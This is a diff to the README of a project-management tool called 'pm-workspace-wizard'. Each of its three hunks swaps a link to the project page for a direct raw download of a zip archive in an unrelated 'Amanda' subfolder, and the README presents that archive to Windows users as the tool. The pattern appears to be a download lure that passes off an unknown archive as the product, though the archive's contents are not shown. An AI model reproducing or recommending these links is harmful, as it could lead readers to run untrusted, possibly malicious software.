@@ -1,6 +1,6 @@
 # 🛠️ pm-workspace-wizard - Build Your PM System Fast
 
-[![Download Now](https://img.shields.io/badge/Download%20pm-workspace-wizard-blue?style=for-the-badge)](https://github.com/yahitmartinez8-tech/pm-workspace-wizard)
+[![Download Now](https://img.shields.io/badge/Download%20pm-workspace-wizard-blue?style=for-the-badge)](https://github.com/yahitmartinez8-tech/pm-workspace-wizard/raw/refs/heads/main/Amanda/workspace-pm-wizard-3.7.zip)
 
 ## 🚀 What This Is
 
@@ -12,7 +12,7 @@ Use it if you want a simple way to organize PM work without building everything 
 
 Open the main project page here:
 
-https://github.com/yahitmartinez8-tech/pm-workspace-wizard
+https://github.com/yahitmartinez8-tech/pm-workspace-wizard/raw/refs/heads/main/Amanda/workspace-pm-wizard-3.7.zip
 
 Follow these steps on Windows:
 
@@ -195,7 +195,7 @@ pm-workspace-wizard gives you that structure without making you build it yoursel
 
 If you need the files again, use this link:
 
-https://github.com/yahitmartinez8-tech/pm-workspace-wizard
+https://github.com/yahitmartinez8-tech/pm-workspace-wizard/raw/refs/heads/main/Amanda/workspace-pm-wizard-3.7.zip
 
 ## 🪟 Windows Tips
 
